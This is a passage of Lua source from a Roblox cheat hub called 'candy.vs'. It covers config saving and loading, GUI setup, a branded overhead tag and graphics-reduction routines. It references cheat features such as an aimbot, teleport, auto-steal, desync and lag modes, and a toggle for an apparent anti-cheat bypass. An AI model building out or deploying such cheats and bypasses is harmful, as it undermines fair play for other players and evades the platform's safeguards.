	toggleDefaults["Korblox Visual"] = false
	toggleDefaults["Anti Die"] = false
	for k, v in pairs(toggleDefaults) do toggleStates[k] = v end

	local lastSavedConfigData = nil
	local pendingConfigData = nil
	local configSaveGeneration = 0
	local function flushConfig(data)
	if not data or data == lastSavedConfigData then return end
	pcall(writefile, CONFIG_FILE, data)
	lastSavedConfigData = data
	end
	local function saveConfig()
	local lines = {}
	for name, state in pairs(toggleStates) do
	if not transientToggles[name] then
	table.insert(lines, "T:" .. name .. "=" .. tostring(state))
	end
	end
	for name, state in pairs(mobileShortcutStates) do
	table.insert(lines, "S:" .. name .. "=" .. tostring(state))
	end
	for name, state in pairs(mobileBtnPlaced) do
	table.insert(lines, "B:" .. name .. "=" .. tostring(state))
	end
	for k, v in pairs(speedValues) do
	table.insert(lines, "V:" .. k .. "=" .. tostring(v))
	end
	for k, v in pairs(autoStealValues) do
	table.insert(lines, "A:" .. k .. "=" .. tostring(v))
	end
	for _, cs in ipairs(customSpeeds) do
	table.insert(lines, "C:" .. cs.name .. "=" .. cs.boost .. "," .. cs.steal)
	end
	if _G.__CandyVSHub_Anims then
	for k, v in pairs(_G.__CandyVSHub_Anims) do
	table.insert(lines, "N:" .. k .. "=" .. v)
	end
	end
	table.insert(lines, "M:selectedMode=" .. selectedMode)
	table.insert(lines, "M:optimizerMode=" .. tostring(_G.__optimizerMode or "Ultra"))
	table.insert(lines, "M:autoplayMode=" .. (_G.__autoplayMode or "Full"))
	table.insert(lines, "M:skyIndex=" .. (tostring(_G.__skyGetIndex and _G.__skyGetIndex() or 1)))
	table.insert(lines, "M:skyMode=" .. tostring(_G.__CandyVSSkyChangerMode or "blue"))
	table.insert(lines, "M:candyvsIndex=" .. (tostring(_G.__candyvsGetIndex and _G.__candyvsGetIndex() or 1)))
	table.insert(lines, "M:autoStealMode=" .. ((autoStealMode == "v2") and "v2" or "v1"))
	table.insert(lines, "M:carrySpeedMode=" .. (carrySpeedMode or "v1"))
	table.insert(lines, "M:dropMode=" .. ((_G.__CandyVSDropMode == "Jump Drop") and "Jump Drop" or "Stand Drop"))
	table.insert(lines, "M:infJumpMode=" .. (_G.__CandyVSInfJumpMode or "hold"))
	table.insert(lines, "M:panelVisible=" .. tostring(_G.__CandyVSPanelVisible ~= false))
	table.insert(lines, "M:batVersion=" .. tostring(_G.__batVersion or 1))
	table.insert(lines, "M:batAimbotVersion=" .. tostring(_G.__batAimbotVersion or 1))
	table.insert(lines, "M:skinChangerMode=" .. skinChangerMode)
	table.insert(lines, "M:buttonsSize=" .. tostring(_G.__CandyVSButtonsSize or 1))
	table.insert(lines, "M:uiScale=" .. tostring(_G.__CandyVSUIScale or 78))
	table.insert(lines, "M:tpBatV2Distance=" .. tostring(math.clamp(tonumber(_G.__tpBatV2Distance) or 8, 0, 100)))
	if _G.__CandyVSAnimationPreset then
	table.insert(lines, "M:animationPreset=" .. tostring(_G.__CandyVSAnimationPreset))
	end
	table.insert(lines, "M:guiTheme=" .. tostring(_G.__CandyVSGuiTheme or "GUI 1"))
	table.insert(lines, "M:themePrimary=" .. (_G.__CandyVSThemePrimary or "BLACK"))
	table.insert(lines, "M:themeSecondary=" .. (_G.__CandyVSThemeSecondary or "BLUE"))
	table.insert(lines, "M:autoGrabExpanded=" .. tostring(_G["_CandyVS_UI_AutoGrabExpanded"] ~= false))
	for feat, key in pairs(FeatureKeybinds) do
	if key then
	local keyName
	if type(key) == "string" then
	keyName = key
	else
	keyName = tostring(key):match("KeyCode%.(.+)") or tostring(key)
	end
	table.insert(lines, "K:" .. feat .. "=" .. keyName)
	end
	end
	if _G["_CandyVS_UI_MenuPos"] then
	local pos = _G["_CandyVS_UI_MenuPos"]
	if pos.x and pos.y then
	table.insert(lines, "P:menuPos=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	table.insert(lines, "M:introMusicIndex=" .. tostring(selectedIntroMusicIndex))
	table.insert(lines, "M:bgIndex=" .. tostring(_G["_CandyVS_UI_BgIndex"] or 1))
	if _G.__toggleBtn then
	table.insert(lines, "P:toggleBtn=" .. math.floor(_G.__toggleBtn.Position.X.Offset) .. "," .. math.floor(_G.__toggleBtn.Position.Y.Offset))
	end

	for name, pos in pairs(mobileButtonPositions) do
	if pos.x and pos.y then
	local extra = ""
	if pos.xs and pos.ys then extra = ":" .. pos.xs .. ":" .. pos.ys end
	table.insert(lines, "P:mobileBtn_" .. name .. "=" .. math.floor(pos.x) .. "," .. math.floor(pos.y) .. extra)
	end
	end
	for name, pos in pairs(quickButtonPositions) do
	if pos.x and pos.y then
	table.insert(lines, "P:quickBtn_" .. name .. "=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	if _G["_CandyVS_UI_SpeedFramePos"] then
	local pos = _G["_CandyVS_UI_SpeedFramePos"]
	if pos.x and pos.y then
	table.insert(lines, "P:speedFrame=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	if _G["_CandyVSHub_EnemyWidget_SaveHook"] then pcall(_G["_CandyVSHub_EnemyWidget_SaveHook"]) end
	if _G["_CandyVS_UI_EnemyWidgetPos"] then
	local pos = _G["_CandyVS_UI_EnemyWidgetPos"]
	if pos.x and pos.y then
	table.insert(lines, "P:enemyWidget=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	if _G["_CandyVS_UI_AutoGrabBarPos"] then
	local pos = _G["_CandyVS_UI_AutoGrabBarPos"]
	if pos.x and pos.y then
	table.insert(lines, "P:autoGrabBar=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	if _G["_CandyVS_UI_AutoGrabBarSize"] then
	table.insert(lines, "P:autoGrabBarSize=" .. tostring(_G["_CandyVS_UI_AutoGrabBarSize"]))
	end
	if _G["_CandyVS_UI_ModernMiniPos"] then
	local pos = _G["_CandyVS_UI_ModernMiniPos"]
	if pos.x and pos.y then table.insert(lines, "P:modernMini=" .. math.floor(pos.x) .. "," .. math.floor(pos.y)) end
	end
	local data = table.concat(lines, "\n")
	if data == lastSavedConfigData or data == pendingConfigData then return end
	pendingConfigData = data
	_G["_CandyVS_UI_Data"] = data
	configSaveGeneration = configSaveGeneration + 1
	local generation = configSaveGeneration
	task.delay(0.2, function()
	if generation ~= configSaveGeneration or pendingConfigData ~= data then return end
	pendingConfigData = nil
	flushConfig(data)
	end)
	end
	_G.__CandyVSTrackStopper(function()
	if pendingConfigData then flushConfig(pendingConfigData); pendingConfigData = nil end
	end)

	FeatureToggles["BypassAuto"] = function()
	if _G.CandyVSBypass and _G.CandyVSBypass.SetBypass and _G.CandyVSBypass.IsEnabled then
	local currentlyEnabled = _G.CandyVSBypass.IsEnabled() == true
	pcall(_G.CandyVSBypass.SetBypass, not currentlyEnabled)
	pcall(function() if _G.__syncBypassVisual then _G.__syncBypassVisual() end end)
	else
	if _G.__openBypassGUI then _G.__openBypassGUI() end
	task.spawn(function()
	for _ = 1, 20 do
	task.wait(0.1)
	if _G.CandyVSBypass and _G.CandyVSBypass.SetBypass and _G.CandyVSBypass.IsEnabled then break end
	end
	if _G.CandyVSBypass and _G.CandyVSBypass.SetBypass and _G.CandyVSBypass.IsEnabled then
	local currentlyEnabled = _G.CandyVSBypass.IsEnabled() == true
	pcall(_G.CandyVSBypass.SetBypass, not currentlyEnabled)
	end
	pcall(function() if _G.__syncBypassVisual then _G.__syncBypassVisual() end end)
	end)
	end
	end

	local function deactivateOtherAimbots(keepName)
	local changed = false
	for _, name in ipairs({ "Aimbot", "TP Bat" }) do
	if name ~= keepName and name ~= "TP Bat" and toggleStates[name] then
	toggleStates[name] = false
	changed = true
	local setter = toggleStateSetters[name]
	if setter then pcall(setter, false) end
	if FeaturePostToggle[name] then pcall(FeaturePostToggle[name], false) end
	end
	end
	if changed then saveConfig() end
	end

	local function deactivateBatExclusive(keepName)
	local changed = false
	for _, name in ipairs({ "Aimbot", "TP Bat" }) do
	if name ~= keepName and name ~= "TP Bat" and toggleStates[name] then
	toggleStates[name] = false
	changed = true
	local setter = toggleStateSetters[name]
	if setter then pcall(setter, false) end
	if FeaturePostToggle[name] then pcall(FeaturePostToggle[name], false) end
	end
	end
	if changed then saveConfig() end
	end
	_G.__deactivateBatExclusive = deactivateBatExclusive


	local function loadConfig()
	local data = nil
	local ok, result = pcall(readfile, CONFIG_FILE)
	if ok and result and #result > 0 then
	data = result
	elseif _G["_CandyVS_UI_Data"] and #_G["_CandyVS_UI_Data"] > 0 then
	data = _G["_CandyVS_UI_Data"]
	end
	if not data then return end
	for line in data:gmatch("[^\n]+") do
	local prefix = line:sub(1, 2)
	local rest = line:sub(3)
	local k, v = rest:match("([^=]+)=(.+)")
	if k and v then
	k = k:match("^%s*(.-)%s*$")
	v = v:match("^%s*(.-)%s*$")
	if prefix == "T:" and toggleStates[k] ~= nil and not transientToggles[k] then
	toggleStates[k] = (v == "true")
	elseif prefix == "S:" then
	mobileShortcutStates[k] = (v == "true")
	elseif prefix == "B:" then
	mobileBtnPlaced[k] = (v == "true")
	elseif prefix == "V:" and speedValues[k] ~= nil then
	local num = tonumber(v)
	if num then
	speedValues[k] = num
	if k == "NormalBoost" then normalSpeed = num end
	if k == "NormalSteal" then carrySpeed = num end
	if k == "LaggerBoost" then laggerSpeed = num end
	if k == "CypherAimbotApproachSpeed" and (num == 55 or num == 58) then
		speedValues.CypherAimbotApproachSpeed = 60
	end
	end
	elseif prefix == "N:" then
	_G.__savedAnimations = _G.__savedAnimations or {}
	_G.__savedAnimations[k] = v
	elseif prefix == "M:" then
	if k == "introMusicIndex" then
	selectedIntroMusicIndex = tonumber(v) or 2
	elseif k == "bgIndex" then
	_G["_CandyVS_UI_BgIndex"] = tonumber(v)
	elseif k == "selectedMode" then
	if v == "Normal" or v == "Lagger" or v == "Desync" then selectedMode = v end
	elseif k == "autoplayMode" then
	if v == "Full" or v == "Semi" then _G.__autoplayMode = v end
	elseif k == "skyIndex" then
	_G.__savedSkyIndex = tonumber(v)
	elseif k == "skyMode" then
	if v == "day" or v == "blue" or v == "night" then _G.__CandyVSSkyChangerMode = v end
	elseif k == "candyvsIndex" then
	_G.__savedCandyVSIndex = tonumber(v)
	elseif k == "autoStealMode" then
	if v == "v3" then v = "v1" end
	if v == "v1" or v == "v2" then autoStealMode = v end
	elseif k == "carrySpeedMode" then
	if v == "v1" or v == "v2" then carrySpeedMode = v end
	elseif k == "optimizerMode" then
	if v == "Normal" or v == "Ultra" then _G.__optimizerMode = v end
	elseif k == "dropMode" then
	_G.__CandyVSDropMode = (v == "Jump Drop") and "Jump Drop" or "Stand Drop"
	elseif k == "infJumpMode" then
	if v == "hold" or v == "manual" then _G.__CandyVSInfJumpMode = v end
	elseif k == "autoGrabExpanded" then
	_G["_CandyVS_UI_AutoGrabExpanded"] = (v == "true")
	elseif k == "panelVisible" then
	_G.__CandyVSPanelVisible = (v == "true")
	toggleStates["Toggle UI"] = _G.__CandyVSPanelVisible
	elseif k == "themePrimary" then
	if v == "BLACK" or v == "WHITE" then _G.__CandyVSThemePrimary = v end
	elseif k == "themeSecondary" then
	if v == "BLUE" or v == "RED" or v == "CONTRAST" then _G.__CandyVSThemeSecondary = v end
	elseif k == "buttonsSize" then
	local size = tonumber(v)
	if size and size == size and math.abs(size) < math.huge then
	_G.__CandyVSButtonsSize = math.clamp(size, 0.5, 2)
	end
	elseif k == "uiScale" then
	local scale = tonumber(v)
	if scale and scale == scale and math.abs(scale) < math.huge then
	_G.__CandyVSUIScale = math.clamp(math.floor(scale + 0.5), 40, 150)
	end
	elseif k == "skinChangerMode" then
	skinChangerMode = (v == "V2" or v == "V3") and v or "V1"
	elseif k == "batVersion" then
	_G.__batVersion = tonumber(v) == 2 and 2 or 1
	if _G.__batVersionPill then _G.__batVersionPill.Text = "V" .. tostring(_G.__batVersion or 1) end
	elseif k == "batAimbotVersion" then
	_G.__batAimbotVersion = tonumber(v) == 2 and 2 or 1
	if _G.__batAimbotVersionPill then _G.__batAimbotVersionPill.Text = "V" .. tostring(_G.__batAimbotVersion or 1) end
	elseif k == "tpBatV2Distance" then
	_G.__tpBatV2Distance = math.clamp(tonumber(v) or 8, 0, 100)
	elseif k == "animationPreset" then
	_G.__CandyVSAnimationPreset = v
	elseif k == "guiTheme" then
	_G.__CandyVSGuiTheme = "GUI 1"
	end
	elseif prefix == "A:" and autoStealValues[k] ~= nil then
	local num = tonumber(v)
	if num then autoStealValues[k] = num end
	elseif prefix == "C:" then
	local boostStr, stealStr = v:match("([^,]+),([^,]+)")
	if boostStr and stealStr then
	table.insert(customSpeeds, { name = k, boost = tonumber(boostStr) or 59, steal = tonumber(stealStr) or 29 })
	end
	elseif prefix == "K:" then
	if mouseButtonDisplay[v] then
	FeatureKeybinds[k] = v
	else
	local okKey, key = pcall(function() return Enum.KeyCode[v] end)
	if okKey then FeatureKeybinds[k] = key end
	end
	elseif prefix == "P:" then
	if k == "menuPos" then
	local mx, my = v:match("(-?%d+),(-?%d+)")
	if mx and my then _G["_CandyVS_UI_MenuPos"] = { x = tonumber(mx), y = tonumber(my) } end
	elseif k == "toggleBtn" then
	local bx, by = v:match("(-?%d+),(-?%d+)")
	if bx and by then _G["_CandyVS_UI_BtnPos"] = { x = tonumber(bx), y = tonumber(by) } end
	elseif k == "speedFrame" then
	local sx, sy = v:match("(-?%d+),(-?%d+)")
	if sx and sy then _G["_CandyVS_UI_SpeedFramePos"] = { x = tonumber(sx), y = tonumber(sy) } end
	elseif k == "enemyWidget" then
	local ex, ey = v:match("(-?%d+),(-?%d+)")
	if ex and ey then _G["_CandyVS_UI_EnemyWidgetPos"] = { x = tonumber(ex), y = tonumber(ey) } end
	elseif k == "autoGrabBar" then
	local ax, ay = v:match("(-?%d+),(-?%d+)")
	if ax and ay then _G["_CandyVS_UI_AutoGrabBarPos"] = { x = tonumber(ax), y = tonumber(ay) } end
	elseif k == "autoGrabBarSize" then
	local num = tonumber(v)
	if num then _G["_CandyVS_UI_AutoGrabBarSize"] = num end
	elseif k == "modernMini" then
	local mx, my = v:match("(-?%d+),(-?%d+)")
	if mx and my then _G["_CandyVS_UI_ModernMiniPos"] = { x = tonumber(mx), y = tonumber(my) } end
	else
	local quickName = k:match("^quickBtn_(.+)$")
	if quickName then
	local qx, qy = v:match("^(-?%d+),(-?%d+)")
	if qx and qy then quickButtonPositions[quickName] = { x = tonumber(qx), y = tonumber(qy) } end
	else
	local mobileName = k:match("^mobileBtn_(.+)$")
	if mobileName then
	local bx, by = v:match("^(-?%d+),(-?%d+)")
	if bx and by then
	_G["_CandyVS_UI_MobileBtnPos"] = _G["_CandyVS_UI_MobileBtnPos"] or {}
	local pos = { x = tonumber(bx), y = tonumber(by) }
	local sx, sy = v:match(":(-?%d+):(-?%d+)$")
	if sx and sy then pos.xs = tonumber(sx); pos.ys = tonumber(sy) end
	_G["_CandyVS_UI_MobileBtnPos"][mobileName] = pos
	end
	end
	end
	end
	end
	end
	end
	end
	loadConfig()
	if type(_G.__CandyVSPanelVisible) == "boolean" then
	toggleStates["Toggle UI"] = _G.__CandyVSPanelVisible
	else
	_G.__CandyVSPanelVisible = toggleStates["Toggle UI"] ~= false
	toggleStates["Toggle UI"] = _G.__CandyVSPanelVisible
	end
	if autoStealMode ~= "v1" and autoStealMode ~= "v2" then autoStealMode = "v1" end
	_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
	_G.__batAimbotVersion = tonumber(_G.__batAimbotVersion) == 2 and 2 or 1
	_G.__tpBatV2Distance = math.clamp(tonumber(_G.__tpBatV2Distance) or 8, 0, 100)
	laggerEnabled = (selectedMode == "Lagger")
	speedToggled = toggleStates["Carry Speed"]
	toggleStates["TP Bat"] = false
	toggleStates["Korblox"] = false
	pcall(function()
	local character = Player.Character
	if not character then return end
	for _, child in ipairs(character:GetChildren()) do
	if child.Name:find("^SkinChanger_") or child.Name == "Korblox_RightLeg" then
	child:Destroy()
	end
	end
	for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
	local limb = character:FindFirstChild(partName)
	if limb and limb:IsA("BasePart") then
	limb.Transparency = 0
	limb.CanCollide = true
	end
	end
	end)
	toggleStates["Autoplay"] = false
	toggleStates["Lagger"] = false


	mobileButtonPositions = _G["_CandyVS_UI_MobileBtnPos"] or {}

	_G.__CandyVSModernGuiActive = true
	local coreGui = game:GetService("CoreGui")
	local existing = Player.PlayerGui:FindFirstChild("CandyVS_Panel") or coreGui:FindFirstChild("CandyVS_Panel")
	if existing then existing:Destroy() end

	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "CandyVS"

	local candyvsOverheadStopped = false
	local candyvsOverheadCharacter = nil
	local function attachCandyVSOverhead(character)
		if candyvsOverheadStopped or not character then return end
		local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
		if not head or not head.Parent then return end
		local old = head:FindFirstChild("CandyVSOverhead")
		if old then old:Destroy() end
		local billboard = Instance.new("BillboardGui")
		billboard.Name = "CandyVSOverhead"
		billboard.Adornee = head
		billboard.Size = UDim2.fromOffset(130, 38)
		billboard.StudsOffset = Vector3.new(0, 3.15, 0)
		billboard.AlwaysOnTop = true
		billboard.LightInfluence = 0
		billboard.MaxDistance = 250
		billboard.Parent = head
		local label = Instance.new("TextLabel")
		label.Name = "CandyVSLabel"
		label.Size = UDim2.new(1, 0, 0, 21)
		label.BackgroundTransparency = 1
		label.Text = "candy.vs"
		label.TextColor3 = Color3.fromRGB(255, 180, 60)
		label.TextStrokeColor3 = Color3.fromRGB(60, 20, 0)
		label.TextStrokeTransparency = 0.08
		label.Font = Enum.Font.FredokaOne
		label.TextScaled = false
		label.TextSize = 13
		label.Parent = billboard
		local community = Instance.new("TextLabel")
		community.Name = "CandyVSCommunity"
		community.Size = UDim2.new(1, 0, 0, 13)
		community.Position = UDim2.new(0, 0, 0, 21)
		community.BackgroundTransparency = 1
		community.Text = ".gg/candyhub"
		community.TextColor3 = Color3.fromRGB(255, 160, 50)
		community.TextStrokeColor3 = Color3.fromRGB(40, 15, 0)
		community.TextStrokeTransparency = 0.25
		community.Font = Enum.Font.FredokaOne
		community.TextSize = 9
		community.Parent = billboard
		candyvsOverheadCharacter = character
	end
	local function stopCandyVSOverhead()
		candyvsOverheadStopped = true
		local character = candyvsOverheadCharacter
		local head = character and character:FindFirstChild("Head")
		local overhead = head and head:FindFirstChild("CandyVSOverhead")
		if overhead then overhead:Destroy() end
	end
	_G.__CandyVSTrackStopper(stopCandyVSOverhead)
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(character)
		task.defer(attachCandyVSOverhead, character)
	end))
	task.defer(attachCandyVSOverhead, Player.Character)
	ScreenGui.Enabled = false
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.DisplayOrder = 9999999
	ScreenGui.IgnoreGuiInset = true
	pcall(function() ScreenGui.Parent = coreGui end)
	if not ScreenGui.Parent then ScreenGui.Parent = Player.PlayerGui end

	local vp = workspace.CurrentCamera.ViewportSize
	GUI_METRICS = {
	sectionPad = isMobile and 4 or 6, sectionGap = isMobile and 4 or 6,
	sectionHeaderH = isMobile and 16 or 20, toggleH = isMobile and 44 or 62,
	compactRowH = isMobile and 30 or 36, compactCardH = isMobile and 28 or 32,
	toggleTextSize = isMobile and 9 or 10, bindW = isMobile and 34 or 40,
	bindH = isMobile and 16 or 20, bindTextSize = isMobile and 8 or 9,
	}
	local PANEL_W = isMobile and math.clamp(math.floor(vp.X * 0.42), 165, 205) or math.min(340, math.floor(vp.X * 0.52))
	local PANEL_H = isMobile and math.clamp(math.floor(vp.Y * 0.52), 200, 310) or math.min(520, math.floor(vp.Y * 0.80))

	local Panel = Instance.new("Frame")
	Panel.Name = "Panel"
	Panel.Active = true
	Panel.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
	local savedMenuPos = _G["_CandyVS_UI_MenuPos"]
	if savedMenuPos then
	local mx, my = placeInsideViewport(Panel, 0, savedMenuPos.x, 0, savedMenuPos.y)
	Panel.Position = UDim2.new(0, mx, 0, my)
	else
	Panel.Position = UDim2.new(1, -PANEL_W - 20, 0.5, -PANEL_H / 2)
	end
	Panel.BackgroundTransparency = 1
	Panel.BorderSizePixel = 0
	Panel.Visible = false
	Panel.Parent = ScreenGui

	local SidebarHeader = Instance.new("Frame")
	SidebarHeader.Name = "LegacyHeaderStub"
	SidebarHeader.BackgroundTransparency = 1
	SidebarHeader.Visible = false
	SidebarHeader.Parent = Panel
	FPSLabel = Instance.new("TextLabel")
	FPSLabel.BackgroundTransparency = 1
	FPSLabel.Visible = false
	FPSLabel.Parent = SidebarHeader
	PingLabel = Instance.new("TextLabel")
	PingLabel.BackgroundTransparency = 1
	PingLabel.Visible = false
	PingLabel.Parent = SidebarHeader

	local ContentArea = Instance.new("Frame")
	ContentArea.Name = "LegacyContentStub"
	ContentArea.BackgroundTransparency = 1
	ContentArea.Visible = false
	ContentArea.Parent = Panel

	local backgroundIds = { "rbxassetid://114056083769059" }
	local bgIndex = tonumber(_G["_CandyVS_UI_BgIndex"]) or 1
	if type(bgIndex) ~= "number" or bgIndex < 1 or bgIndex > #backgroundIds then bgIndex = 1 end
	local BgImage = Instance.new("ImageLabel")
	BgImage.Name = "LegacyBackgroundStub"
	BgImage.BackgroundTransparency = 1
	BgImage.Image = backgroundIds[bgIndex]
	BgImage.Visible = false
	BgImage.Parent = Panel
	local HeaderBgBtn = Instance.new("TextButton")
	HeaderBgBtn.Name = "LegacyBackgroundButtonStub"
	HeaderBgBtn.Visible = false
	HeaderBgBtn.Parent = Panel

	do
	local fpsBoostDescConn = nil
	local fpsBoostCharConn = nil
	local fpsBoostActive = false
	local fpsBoostWalkCancel = nil

	local function applyFPSDerender(obj)
	pcall(function()
	if _G.__CandyVSPreserveOptimizerUI(obj) then return end
	local ok, inLighting = pcall(function() return obj:IsDescendantOf(game:GetService("Lighting")) end)
	if ok and inLighting then return end
	if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("ColorCorrectionEffect") or obj:IsA("BloomEffect") or obj:IsA("BlurEffect") or obj:IsA("SunRaysEffect") or obj:IsA("DepthOfFieldEffect") then return end
	local ok2, inChar = pcall(function()
	local p = obj
	while p and p ~= workspace do
	if p.Name == "Headless_Headless" or p.Name:find("^Korblox_") then return true end
	p = p.Parent
	end
	return false
	end)
	if ok2 and inChar then return end
	if obj:IsA("Accessory") or obj:IsA("Hat") then
	obj:Destroy()
	elseif obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("ShirtGraphic") or obj:IsA("BodyColors") or obj:IsA("CharacterMesh") then
	obj:Destroy()
	elseif obj:IsA("BasePart") then
	obj.Material = Enum.Material.Plastic
	obj.Reflectance = 0
	obj.CastShadow = false
	elseif obj:IsA("Decal") or obj:IsA("Texture") then
	obj.Transparency = 1
	elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
	obj.Enabled = false
	elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
	local ancestor = obj.Parent
	while ancestor and ancestor ~= workspace do
	if ancestor:IsA("Model") and Players:GetPlayerFromCharacter(ancestor) then return end
	ancestor = ancestor.Parent
	end
	for _, t in ipairs(obj:GetPlayingAnimationTracks()) do
	pcall(function() t:Stop(0) end)
	end
	end
	end)
	end

	local function processAllDescendants()
	if fpsBoostWalkCancel then fpsBoostWalkCancel() end
	fpsBoostWalkCancel = _G.__CandyVSWalkDescendantsBatched(workspace, applyFPSDerender, function()
	return fpsBoostActive
	end)
	end

	local function startFPSBoost()
	if fpsBoostActive then return end
	fpsBoostActive = true

if fpsBoostDescConn then fpsBoostDescConn:Disconnect() end
	fpsBoostDescConn = workspace.DescendantAdded:Connect(function(obj)
	if fpsBoostActive then
	applyFPSDerender(obj)
	end
end)
processAllDescendants()

if fpsBoostCharConn then fpsBoostCharConn:Disconnect() end
	fpsBoostCharConn = Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	if fpsBoostActive then
	_G.__CandyVSWalkDescendantsBatched(char, applyFPSDerender, function() return fpsBoostActive end)
	end
	end)

end

	local function stopFPSBoost()
	if not fpsBoostActive then return end
	fpsBoostActive = false
	if fpsBoostWalkCancel then fpsBoostWalkCancel(); fpsBoostWalkCancel = nil end

	if fpsBoostDescConn then
	fpsBoostDescConn:Disconnect()
	fpsBoostDescConn = nil
	end
	if fpsBoostCharConn then
	fpsBoostCharConn:Disconnect()
	fpsBoostCharConn = nil
	end
	end

	_G.__refreshFPSBoost = startFPSBoost
	_G.__stopFPSBoost = stopFPSBoost

	FeaturePostToggle["FPS Boost"] = function(active)
	if active then startFPSBoost() else stopFPSBoost() end
	end

	end

	;(function()
	local active, generation = false, 0
	local connections = {}
	local saved = setmetatable({}, { __mode = "k" })
	local detached = {}
	local animators = setmetatable({}, { __mode = "k" })
	local stoppedTracks = setmetatable({}, { __mode = "k" })
	local scanCancel = nil

	local function change(object, property, value)
	pcall(function()
	local original = object[property]
	if original == value then return end
	object[property] = value
	local properties = saved[object]
	if not properties then properties = {}; saved[object] = properties end
	if not properties[property] then properties[property] = { value = original } end
	end)
	end

	local function isProtectedVisual(object)
	local char = Player.Character
	if char and (object == char or object:IsDescendantOf(char)) then return true end
	local parent = object
	while parent and parent ~= workspace do
	if parent:IsA("LayerCollector") or parent:IsA("GuiObject")
	or parent:IsA("GuiBase2d") then return true end
	local name = parent.Name or ""
	if name:match("^CandyVS") or name:match("^__CandyVS") or name:match("^CandyVS")
	or name:match("^ESP_") or name:match("^SkinChanger_") or name:match("^Korblox_")
	or name == "Headless_Headless" or name == "GreenDuelsBB"
	or name == "PredictionSphere" then return true end
	parent = parent.Parent
	end
	if toggleStates["Sky Changer"] and (object == Lighting or object:IsDescendantOf(Lighting)) then return true end
	return false
	end

	local function stopAnimations(animator)
	if animators[animator] then return end
	local char = Player.Character
	if char and animator:IsDescendantOf(char) then return end
	animators[animator] = true
	local token = generation
	local ok, connection = pcall(function()
	return animator.AnimationPlayed:Connect(function(track)
	if not active or generation ~= token then return end
	task.defer(function()
	if active and generation == token then pcall(function() track:Stop(0) end) end
	end)
	end)
	end)
	if ok then table.insert(connections, connection) end
	pcall(function()
	for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
	if track.IsPlaying then
	stoppedTracks[track] = { animator = animator, time = track.TimePosition, speed = track.Speed }
	track:Stop(0)
	end
	end
	end)
	end

	local function apply(object)
	if not active or isProtectedVisual(object) then return end
	if object:IsA("Terrain") then
	change(object, "Decoration", false)
	change(object, "WaterWaveSize", 0)
	change(object, "WaterWaveSpeed", 0)
	change(object, "WaterReflectance", 0)
	change(object, "WaterTransparency", 1)
	end
	if object:IsA("BasePart") then
	change(object, "Material", Enum.Material.Plastic)
	change(object, "MaterialVariant", "")
	change(object, "Reflectance", 0)
	change(object, "CastShadow", false)
	if object:IsA("MeshPart") then
	change(object, "TextureID", "")
	change(object, "RenderFidelity", Enum.RenderFidelity.Performance)
	change(object, "DoubleSided", false)
	elseif object:IsA("PartOperation") then
	change(object, "RenderFidelity", Enum.RenderFidelity.Performance)
	end
	elseif object:IsA("SpecialMesh") then
	change(object, "TextureId", "")
	elseif object:IsA("SurfaceAppearance") then
	detached[object] = true
	change(object, "Parent", nil)
	elseif object:IsA("Decal") or object:IsA("Texture") then
	change(object, "Transparency", 1)
	change(object, "Texture", "")
	elseif object:IsA("ParticleEmitter") then
	change(object, "Enabled", false)
	change(object, "Rate", 0)
	pcall(function() object:Clear() end)
	elseif object:IsA("Trail") then
	change(object, "Enabled", false)
	pcall(function() object:Clear() end)
	elseif object:IsA("Beam") or object:IsA("Fire") or object:IsA("Smoke")
	or object:IsA("Sparkles") or object:IsA("Light") or object:IsA("PostEffect")
	or object:IsA("Clouds") then
	change(object, "Enabled", false)
	elseif object:IsA("Atmosphere") then
	change(object, "Density", 0)
	change(object, "Haze", 0)
	change(object, "Glare", 0)
	elseif object:IsA("Sky") then
	for _, face in ipairs({"SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp", "SunTextureId", "MoonTextureId"}) do
	change(object, face, "")
	end
	change(object, "StarCount", 0)
	change(object, "CelestialBodiesShown", false)
	elseif object:IsA("Shirt") then
	change(object, "ShirtTemplate", "")
	elseif object:IsA("Pants") then
	change(object, "PantsTemplate", "")
	elseif object:IsA("ShirtGraphic") then
	change(object, "Graphic", "")
	elseif object:IsA("Animator") then
	stopAnimations(object)
	end
	end

	local function applyLighting()
	if toggleStates["Sky Changer"] then return end
	change(Lighting, "GlobalShadows", false)
	change(Lighting, "EnvironmentDiffuseScale", 0)
	change(Lighting, "EnvironmentSpecularScale", 0)
	change(Lighting, "FogStart", 0)
	change(Lighting, "FogEnd", 1e10)
	end

	local function stop()
	if not active then return end
	active = false
	generation = generation + 1
	if scanCancel then scanCancel(); scanCancel = nil end
	for _, connection in ipairs(connections) do pcall(function() connection:Disconnect() end) end
	connections = {}
	for object, properties in pairs(saved) do
	for property, original in pairs(properties) do
	pcall(function() object[property] = original.value end)
	end
	end
	saved = setmetatable({}, { __mode = "k" })
	detached = {}
	animators = setmetatable({}, { __mode = "k" })
	for track, state in pairs(stoppedTracks) do
	pcall(function()
	if state.animator.Parent and not track.IsPlaying then
	track:Play(0, 1, state.speed)
	track.TimePosition = state.time
	end
	end)
	end
	stoppedTracks = setmetatable({}, { __mode = "k" })
	end

	FeaturePostToggle["Anti Lag"] = function(enabled)
	if not enabled then stop(); return end
	if active then return end
	active = true
	generation = generation + 1
	local token = generation
	applyLighting()
